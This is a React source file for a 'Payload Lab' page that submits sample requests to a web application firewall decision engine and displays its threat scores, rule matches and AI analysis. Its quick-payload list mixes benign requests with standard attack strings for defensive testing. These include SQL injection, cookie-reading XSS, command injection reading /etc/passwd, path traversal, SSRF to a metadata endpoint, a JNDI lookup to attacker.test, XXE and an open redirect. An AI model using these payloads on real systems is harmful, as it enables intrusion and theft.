import React, { useState } from "react";
import { decisionAPI } from "../services/api";
import Loader from "../components/Loader";
import Button from "../components/ui/Button";

const testPayloads = [
  ["Normal query", "/api/books?search=harry+potter&page=1"],
  ["Normal JSON", '{"action":"search","term":"annual report","page":2}'],
  ["Normal login", "POST /login username=alice&password=Password123&remember=1"],
  ["Normal checkout", '{"cartId":"CART-1024","coupon":"SAVE10","paymentMethod":"card"}'],
  ["Normal profile update", "PUT /profile name=Ravi Kumar&city=Pune&newsletter=true"],
  ["Normal file download", "GET /download?file=invoice-2026-06.pdf"],
  ["Normal search special chars", "/api/search?q=c%2B%2B+guide&sort=relevance"],
  ["Intermediate redirect", "next=https://example.net/welcome"],
  ["Intermediate admin probe", "GET /admin/login?next=/dashboard"],
  ["Intermediate encoded tag text", "comment=%3Cb%3Ehello%3C%2Fb%3E"],
  ["Intermediate suspicious query", "/api/search?q=select+best+union+college"],
  ["Intermediate long comment", `comment=${"This is a normal product review. ".repeat(18)}`],
  ["SQL injection", "' OR '1'='1' --"],
  ["Stacked SQL", "1; DROP TABLE users; --"],
  ["Union SQL", "' UNION SELECT username,password FROM users --"],
  ["Time SQL", "' OR IF(1=1,SLEEP(5),0) --"],
  ["Encoded SQL", "%27%20OR%20%271%27%3D%271%27%20--"],
  ["XSS script", '<script>alert("XSS")</script>'],
  ["Encoded XSS", "%3Cscript%3Ealert('xss')%3C%2Fscript%3E"],
  ["XSS image handler", '<img src=x onerror=alert(document.cookie)>'],
  ["XSS SVG handler", '<svg onload=fetch("/api/session")>'],
  ["Command injection", "username=admin; cat /etc/passwd"],
  ["Command substitution", "host=127.0.0.1 && whoami"],
  ["Path traversal", "../../../../../etc/passwd"],
  ["Encoded traversal", "..%2f..%2f..%2fetc%2fpasswd"],
  ["Windows traversal", "..\\..\\..\\windows\\win.ini"],
  ["SSRF metadata", "http://169.254.169.254/latest/meta-data/"],
  ["SSRF localhost", "url=http://127.0.0.1:8000/admin"],
  ["NoSQL injection", '{"$ne": null}'],
  ["NoSQL operator", '{"username":{"$gt":""},"password":{"$ne":""}}'],
  ["LDAP injection", "admin)(|(password=*))"],
  ["Template injection", "{{7*7}} ${jndi:ldap://attacker.test/a}"],
  ["XXE payload", '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>'],
  ["Header injection", "name=guest%0D%0ASet-Cookie:%20admin=true"],
  ["Open redirect", "next=https://evil.example/login"],
  ["Oversized input", `comment=${"A".repeat(512)}<script>alert(1)</script>`],
  ["Mixed vector", "search=<script>document.cookie</script>&id=123 OR 1=1 --"],
];

const scoreColor = (score) => {
  if (score >= 0.75) return "bg-rose-500";
  if (score >= 0.5) return "bg-amber-500";
  return "bg-emerald-500";
};

const TestPayload = () => {
  const [formData, setFormData] = useState({ ip: "192.168.1.100", payload: "" });
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);

  const handleSubmit = async (event) => {
    event.preventDefault();
    setLoading(true);
    setError(null);
    setResult(null);

    try {
      const response = await decisionAPI.analyze(formData);
      const log = response.data.log || {};
      const prediction = log.prediction || {};
      setResult({
        ...log,
        effectiveDecision: response.data.effectiveDecision,
        modelScores: {
          rules: prediction.rules ?? 0,
          payload: prediction.payload ?? 0,
          xss: prediction.xss ?? 0,
          bot: prediction.bot ?? 0,
          ddos: prediction.ddos ?? 0,
          behavior: prediction.behavior ?? 0,
        },
        ruleMatches: prediction.ruleMatches || [],
        reasons: prediction.reasons || [],
        aiDecision: prediction.aiDecision || null,
        detectorStatus: prediction.detectorStatus || [],
      });
    } catch (err) {
      setError(err.response?.data?.error || "Failed to analyze payload.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="animate-fadeIn space-y-6">
      <div className="page-header">
        <div>
          <h1 className="page-title">Payload Lab</h1>
          <p className="page-subtitle">Send controlled payloads through the WAF decision engine.</p>
        </div>
      </div>

      <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
        <section className="panel p-5">
          <h2 className="panel-title mb-5">Request Input</h2>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="label">IP Address</label>
              <input
                className="input"
                value={formData.ip}
                onChange={(event) => setFormData({ ...formData, ip: event.target.value })}
                required
              />
            </div>
            <div>
              <label className="label">Payload</label>
              <textarea
                className="textarea min-h-36 font-mono text-sm"
                value={formData.payload}
                onChange={(event) => setFormData({ ...formData, payload: event.target.value })}
                placeholder="Enter request payload"
                required
              />
            </div>
            <Button type="submit" className="w-full" disabled={loading}>
              {loading ? "Analyzing..." : "Analyze payload"}
            </Button>
          </form>

          <div className="mt-6">
            <h3 className="mb-3 text-sm font-bold text-[var(--app-text)]">Quick payloads</h3>
            <div className="max-h-80 space-y-2 overflow-y-auto pr-1">
              {testPayloads.map(([name, payload]) => (
                <button
                  key={name}
                  type="button"
                  onClick={() => setFormData({ ...formData, payload })}
                  className="w-full rounded-lg border border-[var(--app-border)] bg-[var(--app-surface-muted)] px-3 py-2 text-left transition hover:border-[var(--app-primary)]"
                >
                  <span className="block text-sm font-semibold text-[var(--app-text)]">{name}</span>
                  <span className="block truncate font-mono text-xs text-[var(--app-text-muted)]">{payload}</span>
                </button>
              ))}
            </div>
          </div>
        </section>

        <section className="panel p-5">
          <h2 className="panel-title mb-5">Analysis Result</h2>
          {loading && <Loader text="Analyzing payload..." />}
          {error && <div className="panel-muted px-4 py-3 text-sm text-[var(--app-danger)]">{error}</div>}

          {!loading && !error && !result && (
            <div className="py-16 text-center text-[var(--app-text-muted)]">
              Submit a payload to see the decision, model scores, and rule matches.
            </div>
          )}

          {!loading && result && (
            <div className="space-y-5">
              <div className="flex items-center justify-between rounded-lg border border-[var(--app-border)] bg-[var(--app-surface-muted)] p-4">
                <span className="text-sm font-semibold text-[var(--app-text-muted)]">Decision</span>
                <span className={`badge ${result.decision === "block" ? "badge-block" : result.decision === "alert" ? "badge-alert" : "badge-allow"}`}>
                  {result.decision || "allow"}
                </span>
              </div>

              <div>
                <div className="mb-2 flex justify-between text-sm">
                  <span className="font-semibold text-[var(--app-text)]">Threat score</span>
                  <span className="text-[var(--app-text-muted)]">{((result.threatScore || 0) * 100).toFixed(1)}%</span>
                </div>
                <div className="progress-track">
                  <div className={`progress-fill ${scoreColor(result.threatScore || 0)}`} style={{ width: `${Math.min((result.threatScore || 0) * 100, 100)}%` }} />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3">
                {Object.entries(result.modelScores).map(([model, score]) => (
                  <div key={model} className="panel-muted p-3">
                    <div className="text-xs font-semibold uppercase text-[var(--app-text-muted)]">{model}</div>
                    <div className="mt-1 text-lg font-bold text-[var(--app-text)]">{(score * 100).toFixed(1)}%</div>
                  </div>
                ))}
              </div>

              {result.aiDecision && (
                <div className="panel-muted p-4">
                  <h3 className="mb-2 text-sm font-bold text-[var(--app-text)]">AI decision analysis</h3>
                  <div className="mb-3 flex flex-wrap gap-2">
                    <span className="badge badge-alert">
                      Signal: {result.aiDecision.primarySignal}
                    </span>
                    <span className="badge badge-allow">
                      Confidence: {((result.aiDecision.confidence || 0) * 100).toFixed(1)}%
                    </span>
                    {result.aiDecision.source && (
                      <span className="badge badge-neutral">
                        Source: {result.aiDecision.source}
                      </span>
                    )}
                  </div>
                  {result.aiDecision.analysis?.summary && (
                    <p className="mb-3 text-sm leading-6 text-[var(--app-text)]">
                      {result.aiDecision.analysis.summary}
                    </p>
                  )}
                  <div className="space-y-3 text-sm text-[var(--app-text-muted)]">
                    {result.aiDecision.analysis?.payloadInterpretation && (
                      <div>
                        <div className="font-semibold text-[var(--app-text)]">Payload interpretation</div>
                        <p>{result.aiDecision.analysis.payloadInterpretation}</p>
                      </div>
                    )}
                    {result.aiDecision.analysis?.scoreInterpretation && (
                      <div>
                        <div className="font-semibold text-[var(--app-text)]">Score interpretation</div>
                        <p>{result.aiDecision.analysis.scoreInterpretation}</p>
                      </div>
                    )}
                    {[
                      ["Evidence", result.aiDecision.analysis?.evidence],
                      ["Risk factors", result.aiDecision.analysis?.riskFactors],
                      ["Benign factors", result.aiDecision.analysis?.benignFactors],
                    ].map(([title, items]) =>
                      items?.length ? (
                        <div key={title}>
                          <div className="font-semibold text-[var(--app-text)]">{title}</div>
                          <ul className="mt-1 list-disc space-y-1 pl-5">
                            {items.map((item) => (
                              <li key={item}>{item}</li>
                            ))}
                          </ul>
                        </div>
                      ) : null
                    )}
                    {result.aiDecision.analysis?.recommendedAction && (
                      <div>
                        <div className="font-semibold text-[var(--app-text)]">Recommended action</div>
                        <p>{result.aiDecision.analysis.recommendedAction}</p>
                      </div>
                    )}
                    {(result.aiDecision.reasons || []).length > 0 && (
                      <div>
                        <div className="font-semibold text-[var(--app-text)]">Decision reasons</div>
                        <ul className="mt-1 list-disc space-y-1 pl-5">
                          {(result.aiDecision.reasons || []).map((reason) => (
                            <li key={reason}>{reason}</li>
                          ))}
                        </ul>
                      </div>
                    )}
                  </div>
                </div>
              )}

              <div className="panel-muted p-4">
                <h3 className="mb-2 text-sm font-bold text-[var(--app-text)]">Rule matches</h3>
                {result.ruleMatches.length === 0 ? (
                  <p className="text-sm text-[var(--app-text-muted)]">No deterministic rules matched.</p>
                ) : (
                  <div className="flex flex-wrap gap-2">
                    {result.ruleMatches.map((match) => (
                      <span key={match.id} className="badge badge-block">{match.category}: {match.id}</span>
                    ))}
                  </div>
                )}
                {result.reasons.length > 0 && (
                  <ul className="mt-3 space-y-1 text-sm text-[var(--app-text-muted)]">
                    {result.reasons.map((reason) => (
                      <li key={reason}>{reason}</li>
                    ))}
                  </ul>
                )}
              </div>
            </div>
          )}
        </section>
      </div>
    </div>
  );
};

export default TestPayload;
